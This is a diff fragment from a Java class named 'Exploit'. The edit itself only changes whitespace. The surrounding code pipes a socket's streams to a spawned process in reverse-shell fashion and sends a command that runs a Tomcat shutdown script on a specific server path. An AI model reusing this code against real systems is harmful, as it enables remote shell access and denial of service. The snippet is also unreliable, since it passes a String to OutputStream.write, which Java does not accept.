@@ -33,7 +33,7 @@ public class Exploit {
             si=s.getInputStream();
         OutputStream po=p.getOutputStream(),so=s.getOutputStream();
         so.write("sh /home/centos/drive/apache-tomcat-8.0.36/bin/shutdown.sh");
-        
+    
         p.destroy();
         s.close();
     }
